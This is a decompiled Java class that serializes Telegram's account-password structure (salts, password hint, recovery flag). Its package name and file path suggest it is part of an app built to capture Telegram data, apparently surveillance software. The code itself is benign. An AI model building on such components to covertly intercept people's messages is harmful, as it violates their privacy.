package com.vvt.capture.telegram.internal;

public class TLRPC$TL_account_password
  extends TLRPC.account_Password
{
  public static int constructor = 2081952796;
  
  public void readParams(AbstractSerializedData paramAbstractSerializedData, boolean paramBoolean)
  {
    Object localObject = paramAbstractSerializedData.readByteArray(paramBoolean);
    this.current_salt = ((byte[])localObject);
    localObject = paramAbstractSerializedData.readByteArray(paramBoolean);
    this.new_salt = ((byte[])localObject);
    localObject = paramAbstractSerializedData.readString(paramBoolean);
    this.hint = ((String)localObject);
    boolean bool = paramAbstractSerializedData.readBool(paramBoolean);
    this.has_recovery = bool;
    localObject = paramAbstractSerializedData.readString(paramBoolean);
    this.email_unconfirmed_pattern = ((String)localObject);
  }
  
  public void serializeToStream(AbstractSerializedData paramAbstractSerializedData)
  {
    int i = constructor;
    paramAbstractSerializedData.writeInt32(i);
    Object localObject = this.current_salt;
    paramAbstractSerializedData.writeByteArray((byte[])localObject);
    localObject = this.new_salt;
    paramAbstractSerializedData.writeByteArray((byte[])localObject);
    localObject = this.hint;
    paramAbstractSerializedData.writeString((String)localObject);
    boolean bool = this.has_recovery;
    paramAbstractSerializedData.writeBool(bool);
    localObject = this.email_unconfirmed_pattern;
    paramAbstractSerializedData.writeString((String)localObject);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$TL_account_password.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */